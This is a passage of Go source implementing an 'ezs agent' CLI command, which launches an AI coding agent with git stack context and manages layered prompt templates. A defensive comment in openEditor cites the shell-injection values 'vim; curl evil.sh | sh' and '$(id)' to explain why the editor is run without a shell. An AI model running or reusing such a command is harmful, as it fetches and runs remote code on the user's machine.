package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/KulkarniKaustubh/ezstack/v4"
	"github.com/KulkarniKaustubh/ezstack/v4/internal/config"
	"github.com/KulkarniKaustubh/ezstack/v4/internal/git"
	"github.com/KulkarniKaustubh/ezstack/v4/internal/stack"
	"github.com/KulkarniKaustubh/ezstack/v4/internal/ui"
	"github.com/spf13/pflag"
)

// Agent launches an AI agent with stack context
func Agent(args []string) error {
	fs := pflag.NewFlagSet("agent", pflag.ContinueOnError)
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, `%sLaunch AI agent with stack context%s

%sUSAGE%s
    ezs agent [options]                     Launch agent scoped to a stack
    ezs agent feature|feat "description"    Launch agent to build a feature as stacked branches
    ezs agent prompt <flag> <work|feature>  View or edit agent prompt templates

%sMODES%s
    (default)       Work session — agent is scoped to a stack with full context
    feature (feat)  Feature builder — agent breaks a feature into incremental stacked branches
    prompt          View or edit the prompt templates used by the agent

%sOPTIONS%s
    --cmd <command>      Agent CLI to use (default: configured or "claude")
    -s, --stack <hash>   Stack to work on (hash prefix or "name")
    -b, --branch <name>  Branch to work in (implies --stack from branch's stack)
    --dry-run            Print the composed prompt and exit (don't launch agent)
    -h, --help           Show this help message

    If both --stack and --branch are specified, --branch takes priority.
    If neither is specified and you're not on a stacked branch, an interactive
    stack picker is shown.

%sCONFIGURATION%s
    Set default agent: ezs config set agent_command <command>

%sEXAMPLES%s
    %s# Interactive stack selection%s
    ezs agent

    %s# Launch agent on a specific stack by hash prefix%s
    ezs agent -s a1b2c

    %s# Launch agent on a specific stack by name%s
    ezs agent -s "my-feature"

    %s# Launch agent on a specific branch%s
    ezs agent --branch feature-auth

    %s# Build a feature as stacked branches%s
    ezs agent feature "Add user authentication with JWT tokens"

    %s# View the shipped work prompt%s
    ezs agent prompt --shipped work

    %s# Edit custom work instructions%s
    ezs agent prompt --edit work

    %s# Edit repo-specific work instructions%s
    ezs agent prompt --edit --repo work
`, ui.Bold, ui.Reset, ui.Cyan, ui.Reset, ui.Cyan, ui.Reset, ui.Cyan, ui.Reset, ui.Cyan, ui.Reset, ui.Cyan, ui.Reset,
			ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset,
			ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset)
	}

	// Check for prompt subcommand early — before parsing agent flags,
	// so that prompt-specific flags (--edit, --shipped, --custom, --repo, --reset)
	// are not rejected by the agent flag set.
	// Only match "prompt" as a positional arg (not a flag value like -s prompt).
	if sub, rest := firstPositionalArg(args); sub == "prompt" {
		return agentPrompt(rest)
	}

	cmdFlag := fs.String("cmd", "", "Agent CLI to use (overrides config)")
	stackFlag := fs.StringP("stack", "s", "", "Stack hash prefix or name")
	branchFlag := fs.StringP("branch", "b", "", "Branch to work in")
	dryRunFlag := fs.Bool("dry-run", false, "Print the composed prompt and exit without launching the agent")
	noMCPFlag := fs.Bool("no-mcp", false, "Do not auto-install/register the ezstack MCP server; embed docs in the prompt instead")
	helpFlag := fs.BoolP("help", "h", false, "Show help")

	if err := fs.Parse(args); err != nil {
		if err == pflag.ErrHelp {
			return nil
		}
		return err
	}
	if *helpFlag {
		fs.Usage()
		return nil
	}

	cwd, err := os.Getwd()
	if err != nil {
		return err
	}

	g := git.New(cwd)
	mgr, err := stack.NewReadOnlyManager(cwd)
	if err != nil {
		return err
	}

	cfg, err := config.Load()
	if err != nil {
		return err
	}

	repoPath := getMainWorktreePath(g)

	// Determine agent command
	agentCmd := *cmdFlag
	if agentCmd == "" {
		repoCfg := cfg.GetRepoConfig(repoPath)
		agentCmd = repoCfg.GetAgentCommand()
	}

	// Verify agent CLI exists (check only the binary, not its args)
	agentFields := strings.Fields(agentCmd)
	if len(agentFields) == 0 {
		return fmt.Errorf("agent_command is empty.\nConfigure one: ezs config set agent_command <command>")
	}
	if _, err := exec.LookPath(agentFields[0]); err != nil {
		return fmt.Errorf("agent CLI '%s' not found in PATH.\nInstall it or configure a different agent: ezs config set agent_command <command>", agentFields[0])
	}

	// Agent requires worktree mode — each branch needs its own working directory
	// for the agent to work in isolation without disrupting user's workspace
	if !cfg.GetUseWorktrees(repoPath) {
		return fmt.Errorf("ezs agent requires worktree mode.\nThe agent needs separate working directories for each branch to work in isolation.\nEnable worktrees: ezs config set use_worktrees true")
	}

	// Feature mode — optionally uses an existing stack if one is available
	if fs.NArg() > 0 && (fs.Arg(0) == "feature" || fs.Arg(0) == "feat") {
		description := strings.Join(fs.Args()[1:], " ")
		if description == "" {
			return fmt.Errorf("feature mode requires a description.\nUsage: ezs agent feature \"description of the feature\"")
		}
		// Only look up a stack if explicitly requested via -s or -b
		var featureStack *config.Stack
		if *stackFlag != "" || *branchFlag != "" {
			featureStack, err = resolveAgentStack(mgr, *stackFlag, *branchFlag)
			if err != nil {
				return err
			}
		}
		useMCP := ensureEzstackMCP(agentCmd, *noMCPFlag, *dryRunFlag)
		return agentFeature(agentCmd, repoPath, description, featureStack, *dryRunFlag, useMCP)
	}

	// Reject unknown subcommands (e.g. "ezs agent new" or "ezs agent foo")
	if fs.NArg() > 0 {
		return fmt.Errorf("unknown agent subcommand %q.\nValid subcommands: feature (or feat), prompt\nFor help: ezs agent --help", fs.Arg(0))
	}

	// Work mode requires an existing stack
	targetStack, err := resolveAgentStack(mgr, *stackFlag, *branchFlag)
	if err != nil {
		return err
	}

	// Validate: stack must have at least one branch
	if len(targetStack.Branches) == 0 {
		return fmt.Errorf("stack '%s' has no branches. Create one with: ezs new <branch-name>", targetStack.DisplayName())
	}

	branchScoped := *branchFlag != ""
	useMCP := ensureEzstackMCP(agentCmd, *noMCPFlag, *dryRunFlag)
	return agentWork(g, agentCmd, repoPath, targetStack, *branchFlag, branchScoped, *dryRunFlag, useMCP)
}

// ── Prompt subcommand ──────────────────────────────────────────────────────────

func agentPrompt(args []string) error {
	fs := pflag.NewFlagSet("agent prompt", pflag.ContinueOnError)
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, `%sView or edit agent prompt templates%s

%sUSAGE%s
    ezs agent prompt <flag> <work|feature>

%sFLAGS%s
    --shipped            View the shipped (built-in) prompt template
    --custom             View your custom instructions (~/.ezstack/)
    --repo               View or target repo-specific instructions (<repo>/.ezstack/)
    --edit               Edit custom instructions (combine with --repo for repo-specific)
    --reset              Delete custom instructions (combine with --repo for repo-specific)
    -h, --help           Show this help message

    The positional argument "work" or "feature" is required.

%sPROMPT COMPOSITION%s
    The final agent prompt is composed from three layers:
    1. Shipped prompt   — built into ezstack, updated with releases
    2. Custom instructions — ~/.ezstack/agent-{work,feature}-prompt.md (personal)
    3. Repo instructions — <repo>/.ezstack/agent-{work,feature}-prompt.md (per-repo)

    To fully override the shipped prompt, add "override: full" as the first
    line of your custom instructions file. Repo instructions are still injected.

%sTEMPLATE VARIABLES%s (for "override: full" mode)
    {{STACK_JSON}}             Current stack structure as JSON
    {{BRANCH_NAME}}            Current branch name
    {{PARENT_NAME}}            Parent branch name
    {{WORKTREE_PATH}}          Path to the current worktree
    {{EZS_DOCS}}               Full ezstack documentation for AI agents
    {{FEATURE_DESCRIPTION}}    Feature description (feature mode only)
    {{CUSTOM_INSTRUCTIONS}}    Custom instructions slot
    {{REPO_INSTRUCTIONS}}      Repository instructions slot

%sEXAMPLES%s
    %s# View the shipped work prompt%s
    ezs agent prompt --shipped work

    %s# View your custom work instructions%s
    ezs agent prompt --custom work

    %s# View repo-specific feature instructions%s
    ezs agent prompt --repo feature

    %s# Edit custom work instructions%s
    ezs agent prompt --edit work

    %s# Edit repo-specific work instructions%s
    ezs agent prompt --edit --repo work

    %s# Reset (delete) custom work instructions%s
    ezs agent prompt --reset work

    %s# Reset (delete) repo-specific feature instructions%s
    ezs agent prompt --reset --repo feature
`, ui.Bold, ui.Reset, ui.Cyan, ui.Reset, ui.Cyan, ui.Reset,
			ui.Cyan, ui.Reset, ui.Cyan, ui.Reset,
			ui.Cyan, ui.Reset,
			ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset,
			ui.Yellow, ui.Reset, ui.Yellow, ui.Reset, ui.Yellow, ui.Reset,
			ui.Yellow, ui.Reset)
	}

	shippedFlag := fs.Bool("shipped", false, "View the shipped prompt template")
	customFlag := fs.Bool("custom", false, "View custom instructions")
	repoFlag := fs.Bool("repo", false, "Target repo-specific instructions")
	editFlag := fs.Bool("edit", false, "Edit instructions in your editor")
	resetFlag := fs.Bool("reset", false, "Delete instructions file")
	helpFlag := fs.BoolP("help", "h", false, "Show help")

	if err := fs.Parse(args); err != nil {
		if err == pflag.ErrHelp {
			return nil
		}
		return err
	}
	if *helpFlag {
		fs.Usage()
		return nil
	}

	// Require positional arg: "work" or "feature"
	if fs.NArg() < 1 {
		return fmt.Errorf("missing prompt type. Usage: ezs agent prompt <flag> <work|feature>")
	}
	promptType := fs.Arg(0)
	if promptType == "feat" {
		promptType = "feature"
	}
	if promptType != "work" && promptType != "feature" {
		return fmt.Errorf("invalid prompt type %q. Must be \"work\" or \"feature\"", promptType)
	}

	// Resolve repo path for --repo flag
	var repoPath string
	if *repoFlag || *editFlag || *resetFlag {
		// We need repo path for --repo, and also for --edit/--reset (to know if we're in a repo)
		cwd, err := os.Getwd()
		if err != nil && *repoFlag {
			return fmt.Errorf("cannot determine current directory: %w", err)
		}
		if err == nil {
			g := git.New(cwd)
			repoPath = getMainWorktreePath(g)
		}
	}
	if *repoFlag && repoPath == "" {
		return fmt.Errorf("--repo requires being inside a git repository")
	}

	// Dispatch
	if *shippedFlag {
		return showShippedPrompt(promptType)
	}
	if *customFlag {
		return showCustomPrompt(promptType)
	}
	if *repoFlag && !*editFlag && !*resetFlag {
		return showRepoPrompt(promptType, repoPath)
	}
	if *editFlag {
		if *repoFlag {
			return editRepoPrompt(promptType, repoPath)
		}
		return editCustomPrompt(promptType)
	}
	if *resetFlag {
		if *repoFlag {
			return resetRepoPrompt(promptType, repoPath)
		}
		return resetCustomPrompt(promptType)
	}

	// No flags: show usage
	fs.Usage()
	return nil
}

// ── View functions ────────────────────────────────────────────────────────────

func showShippedPrompt(promptType string) error {
	if promptType == "feature" {
		fmt.Printf("%s── Shipped Feature Prompt ──%s\n\n", ui.Cyan, ui.Reset)
		fmt.Print(defaultFeaturePromptTemplate)
		return nil
	}
	// Work mode has two variants: branch-scoped and stack-scoped
	fmt.Printf("%s── Shipped Work Prompt (branch-scoped, used with --branch) ──%s\n\n", ui.Cyan, ui.Reset)
	fmt.Print(defaultWorkBranchPromptTemplate)
	fmt.Println()
	fmt.Printf("%s── Shipped Work Prompt (stack-scoped, default) ──%s\n\n", ui.Cyan, ui.Reset)
	fmt.Print(defaultWorkStackPromptTemplate)
	return nil
}

func showCustomPrompt(promptType string) error {
	path, err := globalInstructionsPath(promptType)
	if err != nil {
		return err
	}
	content, isOverride := loadInstructionsFile(path)
	if content == "" {
		ui.Info(fmt.Sprintf("No custom %s instructions found at %s", promptType, path))
		return nil
	}
	label := "Custom"
	if isOverride {
		label = "Custom (override: full)"
	}
	fmt.Printf("%s── %s %s Instructions (%s) ──%s\n\n", ui.Cyan, label, promptType, path, ui.Reset)
	fmt.Println(content)
	return nil
}

func showRepoPrompt(promptType, repoPath string) error {
	path := repoInstructionsPath(repoPath, promptType)
	content, _ := loadInstructionsFile(path)
	if content == "" {
		ui.Info(fmt.Sprintf("No repo %s instructions found at %s", promptType, path))
		return nil
	}
	fmt.Printf("%s── Repo %s Instructions (%s) ──%s\n\n", ui.Cyan, promptType, path, ui.Reset)
	fmt.Println(content)
	return nil
}

// ── Edit functions ────────────────────────────────────────────────────────────

func getEditor() string {
	editor := os.Getenv("EDITOR")
	if editor == "" {
		editor = os.Getenv("VISUAL")
	}
	if editor == "" {
		editor = "vi"
	}
	return editor
}

func editCustomPrompt(promptType string) error {
	path, err := globalInstructionsPath(promptType)
	if err != nil {
		return err
	}
	path, err = ensureInstructionsFile(path, promptType, "Custom")
	if err != nil {
		return err
	}
	ui.Info(fmt.Sprintf("Opening custom %s instructions: %s", promptType, path))
	return openEditor(getEditor(), path)
}

func editRepoPrompt(promptType, repoPath string) error {
	path := repoInstructionsPath(repoPath, promptType)
	path, err := ensureInstructionsFile(path, promptType, "Repository")
	if err != nil {
		return err
	}
	ui.Info(fmt.Sprintf("Opening repo %s instructions: %s", promptType, path))
	return openEditor(getEditor(), path)
}

// ── Reset functions ───────────────────────────────────────────────────────────

func resetCustomPrompt(promptType string) error {
	path, err := globalInstructionsPath(promptType)
	if err != nil {
		return err
	}
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		ui.Info(fmt.Sprintf("No custom %s instructions to reset (file does not exist)", promptType))
		return nil
	}
	if !ui.ConfirmTUI(fmt.Sprintf("Delete custom %s instructions at %s?", promptType, path)) {
		ui.Info("Cancelled")
		return nil
	}
	if err := os.Remove(path); err != nil {
		return err
	}
	ui.Success(fmt.Sprintf("Deleted custom %s instructions: %s", promptType, path))
	return nil
}

func resetRepoPrompt(promptType, repoPath string) error {
	path := repoInstructionsPath(repoPath, promptType)
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		ui.Info(fmt.Sprintf("No repo %s instructions to reset (file does not exist)", promptType))
		return nil
	}
	if !ui.ConfirmTUI(fmt.Sprintf("Delete repo %s instructions at %s?", promptType, path)) {
		ui.Info("Cancelled")
		return nil
	}
	if err := os.Remove(path); err != nil {
		return err
	}
	ui.Success(fmt.Sprintf("Deleted repo %s instructions: %s", promptType, path))
	return nil
}

func openEditor(editor, filePath string) error {
	// Parse $EDITOR as whitespace-separated tokens with basic quoting support,
	// then invoke exec directly. Never go through `sh -c`: that would let
	// EDITOR values like `vim; curl evil.sh | sh` or `$(id)` execute.
	parts, err := splitEditorCommand(editor)
	if err != nil {
		return fmt.Errorf("parse $EDITOR (%q): %w", editor, err)
	}
	if len(parts) == 0 {
		return fmt.Errorf("no editor configured")
	}
	parts = append(parts, filePath)
	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// splitEditorCommand splits an EDITOR/VISUAL string into argv tokens with
// minimal POSIX-style quoting: single quotes are literal, double quotes are
// literal (no $ expansion since we never hand this to a shell), backslash
// escapes the next character. Returns an error on unterminated quotes.
func splitEditorCommand(s string) ([]string, error) {
	var out []string
	var cur strings.Builder
	inSingle, inDouble, escaped, hasToken := false, false, false, false
	flush := func() {
		if hasToken {
			out = append(out, cur.String())
			cur.Reset()
			hasToken = false
		}
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if escaped {
			cur.WriteByte(c)
			hasToken = true
			escaped = false
			continue
		}
		switch {
		case c == '\\' && !inSingle:
			escaped = true
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			hasToken = true
		case c == '"' && !inSingle:
			inDouble = !inDouble
			hasToken = true
		case (c == ' ' || c == '\t') && !inSingle && !inDouble:
			flush()
		default:
			cur.WriteByte(c)
			hasToken = true
		}
	}
	if inSingle || inDouble {
		return nil, fmt.Errorf("unterminated quote")
	}
	if escaped {
		return nil, fmt.Errorf("trailing backslash")
	}
	flush()
	return out, nil
}

// ── Prompt file management ─────────────────────────────────────────────────────

const overrideFullMarker = "override: full\n"

// loadInstructionsFile reads an instructions file and returns its content.
// If the file starts with "override: full\n", the marker is stripped and
// isOverride is returned as true.  Returns ("", false) if the file doesn't exist.
func loadInstructionsFile(path string) (content string, isOverride bool) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", false
	}
	content = string(data)
	if strings.HasPrefix(content, overrideFullMarker) {
		return strings.TrimPrefix(content, overrideFullMarker), true
	}
	return content, false
}

// promptFilename returns the filename for a given prompt type ("work" or "feature").
func promptFilename(promptType string) string {
	return "agent-" + promptType + "-prompt.md"
}

// globalInstructionsPath returns the path to the global custom instructions file
// in ~/.ezstack/ for the given prompt type.
func globalInstructionsPath(promptType string) (string, error) {
	configDir, err := config.ConfigDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(configDir, promptFilename(promptType)), nil
}

// repoInstructionsPath returns the path to the repo-specific instructions file
// in <repoPath>/.ezstack/ for the given prompt type.
func repoInstructionsPath(repoPath, promptType string) string {
	return filepath.Join(repoPath, ".ezstack", promptFilename(promptType))
}

// ensureInstructionsFile creates the instructions file with a starter comment
// if it doesn't exist. Returns the file path.
func ensureInstructionsFile(path, promptType, location string) (string, error) {
	dir := filepath.Dir(path)
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return "", err
		}
		starter := fmt.Sprintf(`# %s instructions for ezs agent (%s session)
# Lines here are injected into the shipped prompt.
`, location, promptType)
		if location == "Custom" {
			starter += `# To fully override the shipped prompt, add "override: full" as the first line.
`
		}
		starter += `#
# Examples:
#   - Always run tests before committing
#   - Use conventional commits (feat:, fix:, etc.)
#   - This repo uses pnpm, not npm
`
		if err := os.WriteFile(path, []byte(starter), 0644); err != nil {
			return "", err
		}
	}
	return path, nil
}

// firstPositionalArg finds the first positional (non-flag) argument in args.
// It skips flags (--foo, -f) and their values so that e.g. "-s prompt" does not
// match "prompt" as a subcommand.  Returns the matched arg and the remaining
// args after it, or ("", nil) if there are no positional args.
func firstPositionalArg(args []string) (string, []string) {
	// Flags whose values we know consume the next token.
	valuedFlags := map[string]bool{
		"--cmd": true, "-s": true, "--stack": true, "-b": true, "--branch": true,
	}
	skip := false
	for i, a := range args {
		if skip {
			skip = false
			continue
		}
		if strings.HasPrefix(a, "-") {
			if valuedFlags[a] {
				skip = true // next token is the flag value
			}
			continue
		}
		return a, args[i+1:]
	}
	return "", nil
}

// renderPrompt replaces template variables in a prompt template with actual values.
//
// Substitution happens in two passes so that non-doc tokens (like
// {{BRANCH_NAME}}) which appear literally inside the embedded
// DOCUMENTATION.md reference tables are preserved: pass 1 substitutes
// everything except EZS_DOCS, and pass 2 injects the docs body. Each pass
// uses strings.NewReplacer so the content injected by one replacement is
// not re-scanned for other tokens. Custom and repo instruction files may
// also contain literal {{BRANCH_NAME}}-style strings the user doesn't want
// re-expanded, and this structure keeps those intact too.
func renderPrompt(template string, vars map[string]string) string {
	const lateKey = "EZS_DOCS"

	earlyPairs := make([]string, 0, 2*len(vars))
	for key, value := range vars {
		if key == lateKey {
			continue
		}
		earlyPairs = append(earlyPairs, "{{"+key+"}}", value)
	}
	result := strings.NewReplacer(earlyPairs...).Replace(template)

	if value, ok := vars[lateKey]; ok {
		result = strings.NewReplacer("{{"+lateKey+"}}", value).Replace(result)
	}

	return result
}

// ── Stack resolution ───────────────────────────────────────────────────────────

// resolveAgentStack determines which stack to use for the agent.
// Priority: --branch flag (find its stack) > --stack flag > current branch's stack > interactive selection.
func resolveAgentStack(mgr *stack.Manager, stackRef, branchName string) (*config.Stack, error) {
	stacks := mgr.ListStacks()
	if len(stacks) == 0 {
		return nil, fmt.Errorf("no stacks found. Create one with: ezs new <branch-name>")
	}

	// If --branch is specified, find the stack containing that branch
	if branchName != "" {
		s := mgr.FindStackForBranch(branchName)
		if s == nil {
			return nil, ui.NewExitError(ui.ExitBranchNotFound, "branch '%s' not found in any stack", branchName)
		}
		return s, nil
	}

	// If --stack is specified, resolve by hash prefix or name
	if stackRef != "" {
		return resolveStackByRef(mgr, stacks, stackRef)
	}

	// Use the current branch's stack if we're on one. Unlike other ezs
	// commands, we deliberately do NOT fall back to auto-picking when the
	// current branch isn't in any stack: on main (or any non-stack branch)
	// the user must explicitly pass --stack/--branch, otherwise `ezs agent`
	// with a single stack in the repo would silently launch into it.
	currentStack, _, err := mgr.GetCurrentStack()
	if err == nil && currentStack != nil {
		return currentStack, nil
	}
	return nil, ui.NewExitError(ui.ExitNotInStack,
		"current branch is not part of any stack.\nCheckout a stack branch (ezs goto <branch>) or pass --stack/--branch.")
}

// resolveStackByRef resolves a stack reference that could be a hash prefix or a name.
func resolveStackByRef(mgr *stack.Manager, stacks []*config.Stack, ref string) (*config.Stack, error) {
	// Try hash prefix first (existing behavior, requires 3+ chars)
	if len(ref) >= 3 {
		s, err := mgr.GetStackByHash(ref)
		if err == nil {
			return s, nil
		}
	}

	// Try exact name match
	for _, s := range stacks {
		if s.Name == ref {
			return s, nil
		}
	}

	// Try case-insensitive name match
	refLower := strings.ToLower(ref)
	for _, s := range stacks {
		if strings.ToLower(s.Name) == refLower {
			return s, nil
		}
	}

	return nil, fmt.Errorf("no stack found matching '%s' (tried hash prefix and name)", ref)
}

// ── Agent modes ────────────────────────────────────────────────────────────────

// agentWork launches the agent in work session mode.
// If branchScoped is true (--branch was explicitly set), the agent is scoped to that single branch.
// Otherwise, the agent works on the entire stack.
func agentWork(g *git.Git, agentCmd, repoPath string, targetStack *config.Stack, branchName string, branchScoped, dryRun, useMCP bool) error {
	ctx := buildAgentContext(g, repoPath, targetStack, branchName)
	ctx.branchScoped = branchScoped
	ctx.useMCP = useMCP

	prompt, err := buildRenderedWorkPrompt(ctx)
	if err != nil {
		return err
	}

	if dryRun {
		printDryRunPrompt("work", prompt)
		return nil
	}

	if branchScoped {
		workDir := resolveWorkDir(ctx.branchName, ctx.worktreePath, repoPath, targetStack)
		ui.Info(fmt.Sprintf("Launching %s in %s mode on branch '%s'...", agentCmd, ui.Bold+"branch"+ui.Reset, ctx.branchName))
		return spawnAgentProcess(agentCmd, workDir, prompt)
	}

	workDir := resolveWorkDir("", "", repoPath, targetStack)
	ui.Info(fmt.Sprintf("Launching %s in %s mode on stack '%s'...", agentCmd, ui.Bold+"stack"+ui.Reset, targetStack.DisplayName()))
	return spawnAgentProcess(agentCmd, workDir, prompt)
}

// agentFeature launches the agent in feature builder mode.
// If existingStack is non-nil, its branches are provided as context so the agent
// can build on an already-created (but possibly empty) stack instead of starting from scratch.
func agentFeature(agentCmd, repoPath, description string, existingStack *config.Stack, dryRun, useMCP bool) error {
	prompt, err := buildRenderedFeaturePrompt(repoPath, description, existingStack, useMCP)
	if err != nil {
		return err
	}

	if dryRun {
		printDryRunPrompt("feature", prompt)
		return nil
	}

	ui.Info(fmt.Sprintf("Launching %s in %s mode...", agentCmd, ui.Bold+"feature builder"+ui.Reset))
	return spawnAgentProcess(agentCmd, repoPath, prompt)
}

// resolveWorkDir returns the best working directory for the agent.
// For branch-scoped mode: use that branch's worktree.
// For stack/feature mode: use the first branch's worktree (typically the stack root worktree), or repo root.
func resolveWorkDir(branchName, worktreePath, repoPath string, targetStack *config.Stack) string {
	// If a specific branch worktree is provided and exists, use it
	if worktreePath != "" {
		if info, err := os.Stat(worktreePath); err == nil && info.IsDir() {
			return worktreePath
		}
	}
	// For stack/feature mode, try the first branch's worktree
	if branchName == "" && targetStack != nil && len(targetStack.Branches) > 0 {
		firstWT := targetStack.Branches[0].WorktreePath
		if firstWT != "" {
			if info, err := os.Stat(firstWT); err == nil && info.IsDir() {
				return firstWT
			}
		}
	}
	return repoPath
}

// ── Context building ───────────────────────────────────────────────────────────

// agentContext holds the resolved context for prompt building.
type agentContext struct {
	branchName   string
	parentName   string
	worktreePath string
	stackJSON    string
	hasStack     bool
	branchScoped bool // true when --branch was explicitly set
	useMCP       bool // true when the ezstack MCP is registered and prompts should use the stub
	repoPath     string
}

// buildAgentContext resolves the branch and stack state for prompts.
// targetStack must not be nil and must have at least one branch (validated by caller).
func buildAgentContext(g *git.Git, repoPath string, targetStack *config.Stack, branchName string) *agentContext {
	ctx := &agentContext{
		repoPath:  repoPath,
		hasStack:  true,
		stackJSON: buildStackJSON(targetStack),
	}

	// If explicit branch requested, find it within the target stack
	if branchName != "" {
		for _, b := range targetStack.Branches {
			if b.Name == branchName {
				ctx.branchName = b.Name
				ctx.parentName = b.Parent
				ctx.worktreePath = b.WorktreePath
				return ctx
			}
		}
	}

	// Try current branch if it's in the target stack
	if currentBranch, err := g.CurrentBranch(); err == nil {
		for _, b := range targetStack.Branches {
			if b.Name == currentBranch {
				ctx.branchName = b.Name
				ctx.parentName = b.Parent
				ctx.worktreePath = b.WorktreePath
				return ctx
			}
		}
	}

	// Default to first branch in the stack (guaranteed non-empty by caller)
	first := targetStack.Branches[0]
	ctx.branchName = first.Name
	ctx.parentName = first.Parent
	ctx.worktreePath = first.WorktreePath
	return ctx
}

// stackInfo is a lightweight struct for JSON serialization of stack context.
type stackInfo struct {
	Hash     string       `json:"hash"`
	Name     string       `json:"name,omitempty"`
	Root     string       `json:"root"`
	Branches []branchInfo `json:"branches"`
}

type branchInfo struct {
	Name         string `json:"name"`
	Parent       string `json:"parent"`
	WorktreePath string `json:"worktree_path,omitempty"`
	PRState      string `json:"pr_state,omitempty"`
	IsMerged     bool   `json:"is_merged,omitempty"`
}

func buildStackJSON(s *config.Stack) string {
	si := stackInfo{
		Hash:     s.Hash,
		Name:     s.Name,
		Root:     s.Root,
		Branches: make([]branchInfo, 0, len(s.Branches)),
	}
	for _, b := range s.Branches {
		si.Branches = append(si.Branches, branchInfo{
			Name:         b.Name,
			Parent:       b.Parent,
			WorktreePath: b.WorktreePath,
			PRState:      b.PRState,
			IsMerged:     b.IsMerged,
		})
	}
	data, err := json.MarshalIndent(si, "", "  ")
	if err != nil {
		return "{}"
	}
	return string(data)
}

// ── Prompt rendering ───────────────────────────────────────────────────────────

// buildComposedPrompt implements the 3-layer composition logic for any prompt type.
//
// Resolution:
//  1. Load custom instructions from ~/.ezstack/
//  2. Load repo instructions from <repo>/.ezstack/
//  3. If custom has "override: full" → use custom as base template, inject repo via {{REPO_INSTRUCTIONS}}
//  4. Otherwise → use shipped template, inject both custom and repo into their slots
func buildComposedPrompt(shippedTemplate string, vars map[string]string, repoPath, promptType string) (string, error) {
	customPath, err := globalInstructionsPath(promptType)
	if err != nil {
		customPath = "" // non-fatal: just skip custom instructions
	}
	customContent, customOverride := loadInstructionsFile(customPath)
	repoContent, _ := loadInstructionsFile(repoInstructionsPath(repoPath, promptType))

	if customOverride {
		// override: full replaces shipped prompt, but repo instructions still injected
		if repoContent != "" {
			vars["REPO_INSTRUCTIONS"] = "## Repository Instructions\n" + repoContent
		} else {
			vars["REPO_INSTRUCTIONS"] = ""
		}
		return renderPrompt(customContent, vars), nil
	}

	// Normal composition: shipped + custom + repo injected into slots
	if customContent != "" {
		vars["CUSTOM_INSTRUCTIONS"] = "## Custom Instructions\n" + customContent
	} else {
		vars["CUSTOM_INSTRUCTIONS"] = ""
	}
	if repoContent != "" {
		vars["REPO_INSTRUCTIONS"] = "## Repository Instructions\n" + repoContent
	} else {
		vars["REPO_INSTRUCTIONS"] = ""
	}
	return renderPrompt(shippedTemplate, vars), nil
}

func buildRenderedWorkPrompt(ctx *agentContext) (string, error) {
	vars := buildTemplateVars(ctx)
	template := defaultWorkStackPromptTemplate
	if ctx.branchScoped {
		template = defaultWorkBranchPromptTemplate
	}
	return buildComposedPrompt(template, vars, ctx.repoPath, "work")
}

func buildRenderedFeaturePrompt(repoPath, description string, existingStack *config.Stack, useMCP bool) (string, error) {
	vars := map[string]string{
		"FEATURE_DESCRIPTION": description,
		"EZS_DOCS":            docsReferenceFor(useMCP),
	}

	// If an existing stack is provided, include its JSON and adapt the process instructions
	if existingStack != nil && len(existingStack.Branches) > 0 {
		stackJSON := buildStackJSON(existingStack)
		vars["STACK_JSON"] = stackJSON
		vars["EXISTING_STACK_SECTION"] = fmt.Sprintf(`## Existing Stack
The following stack already exists. Use these branches as a starting point — implement your
changes in them and add new branches to this stack as needed.
%s
`, stackJSON)
		vars["PROCESS_INSTRUCTIONS"] = `### Process
1. Explore the codebase to understand the architecture.
2. Review the existing stack branches above — check if they already contain changes.
3. Plan how to implement the feature across these branches (and any new ones needed) — present the plan to the user FIRST.
4. For each branch after user approves:
   a. Navigate to its worktree: ezs goto <branch-name>
   b. Implement the focused change for this branch
   c. Commit: ezs -y commit -m "descriptive message"
   d. Push: ezs -y push
5. If additional branches are needed beyond the existing ones:
   a. Create them: ezs -y new <descriptive-branch-name>
   b. cd to the worktree path printed in the output
   c. Implement, commit, and push as above
6. After all work is done, show the final stack with: ezs ls`
	} else {
		vars["EXISTING_STACK_SECTION"] = ""
		vars["PROCESS_INSTRUCTIONS"] = `### Process
1. Explore the codebase to understand the architecture.
2. Plan a series of incremental branches — present the plan to the user FIRST.
3. For each branch after user approves:
   a. Create it: ezs -y new <descriptive-branch-name>
   b. cd to the worktree path printed in the output
   c. Implement the focused change for this branch
   d. Commit: ezs -y commit -m "descriptive message"
   e. Push: ezs -y push
4. After all branches are created, show the final stack with: ezs ls`
	}

	return buildComposedPrompt(defaultFeaturePromptTemplate, vars, repoPath, "feature")
}

func buildTemplateVars(ctx *agentContext) map[string]string {
	vars := map[string]string{
		"STACK_JSON":    ctx.stackJSON,
		"BRANCH_NAME":   ctx.branchName,
		"PARENT_NAME":   ctx.parentName,
		"WORKTREE_PATH": ctx.worktreePath,
		"EZS_DOCS":      docsReferenceFor(ctx.useMCP),
	}
	return vars
}

// docsReferenceFor returns the MCP stub when the ezstack MCP is active,
// otherwise the full embedded DOCUMENTATION.md.
func docsReferenceFor(useMCP bool) string {
	if useMCP {
		return mcpDocsStub
	}
	return ezsDocsReference
}

// ── Agent process ──────────────────────────────────────────────────────────────

// printDryRunPrompt prints the full composed prompt for inspection and exits.
func printDryRunPrompt(mode, prompt string) {
	fmt.Printf("%s── Composed %s prompt (dry run) ──%s\n\n", ui.Cyan, mode, ui.Reset)
	fmt.Print(prompt)
	if !strings.HasSuffix(prompt, "\n") {
		fmt.Println()
	}
}

// spawnAgentProcess launches the agent CLI with the rendered prompt.
// The full prompt is passed as the first visible user message in the agent's UI.
